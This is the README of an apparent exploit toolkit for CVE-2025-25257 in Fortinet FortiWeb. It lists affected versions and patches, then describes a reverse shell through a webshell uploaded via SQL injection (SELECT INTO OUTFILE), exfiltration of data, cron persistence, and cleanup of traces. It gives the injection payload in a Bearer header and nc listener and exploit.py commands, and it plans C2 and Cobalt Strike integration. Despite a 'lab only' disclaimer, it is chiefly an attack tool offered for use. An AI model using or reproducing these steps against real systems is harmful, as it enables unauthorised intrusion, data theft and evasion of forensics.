# FortiWeb RCE Toolkit 🔐

Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet FortiWeb — featuring **reverse shell**, **encrypted data exfiltration**, **persistence**, and **cleanup**. This toolkit is **strictly for isolated lab/testing environments**. **DO NOT USE in production.**

---

## ⚙️ Features

- ✔️ **Pre‑auth detection** of vulnerable FortiWeb versions (7.0.0–7.0.10, 7.2.0–7.2.10, 7.4.0–7.4.7, 7.6.0–7.6.3)
- 🐚 **Reverse shell** (bash) via `/cgi-bin/shell.sh`
- 📤 **Encrypted data exfiltration** to `/tmp/exfil.txt` (Base64‑encoded)
- 🕒 **Persistence** via cron job (`/etc/cron.d/sys`)
- 🧹 **Full cleanup**: removes shell, cron job, and SQL traces
- 🔒 Active only while listener runs and cleanup occurs

---

## 📊 Severity & Affected Versions

- **CVE‑2025‑25257**: Unauthenticated SQL injection → Remote Code Execution (RCE)
- **CVSS v3.1**: **9.6 (Critical)**
- **Vulnerable versions**:
  - FortiWeb 7.0.0–7.0.10 → Upgrade to **7.0.11+**
  - FortiWeb 7.2.0–7.2.10 → Upgrade to **7.2.11+**
  - FortiWeb 7.4.0–7.4.7 → Upgrade to **7.4.8+**
  - FortiWeb 7.6.0–7.6.3 → Upgrade to **7.6.4+**

---

## 📋 Requirements

- Python **3.6+**
- Install `requests`:
  ```bash
  pip install requests


---
## 🚀 Usage

```bash
git clone https://github.com/youruser/fortiweb_rce_toolkit.git
cd fortiweb_rce_toolkit

# Start listener
nc -lnvp 4444

# Run exploit
python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
  [--exfil "user(),version()"] [--persist]

# After shell exits, press ENTER to cleanup
```

* `--https` if target uses HTTPS

* `--lhost` & `--lport` must match listener settings

* `--exfil` (optional): SQL expression to exfiltrate

* `--persist` (optional): enables cron persistence

---

## 🔧 Technical Workflow

1. Detection via injection (`Authorization: Bearer AAAAAA'or'1'='1`)

2. Upload shell using `SELECT INTO OUTFILE`

3. Optionally exfiltrate data to `/tmp/exfil.txt`

4. Optionally set cron persistence

5. Reverse shell execution

6. Cleanup: shell removal, cron job deletion, SQL cleanup

---

## ⚠️ Warnings & Ethics

* ⚠️ Use **only in lab environments**

* ⚠️ **Illegal/unethical** on production

* 🚨 Patch FortiWeb to **7.0.11+, 7.2.11+, 7.4.8+, or 7.6.4+**

* 🛡️ Consider disabling HTTP/HTTPS management until patched

---

## 🛠️ Future Enhancements

* TLS‑encrypted reverse shell

* Encrypted exfil (SCP, S3)

* Automated C2 communication

* Integration with Red Team frameworks (Cobalt Strike, Covenant)

---

## 📚 References

* Fortinet FortiGuard PSIRT

* BleepingComputer, TheHackerNews, SecurityOnline

* EventusSecurity, InfoSecBulletin, Arctic Wolf, Tenable

---

## 📄 License

MIT License © 2025 `<YourName>`
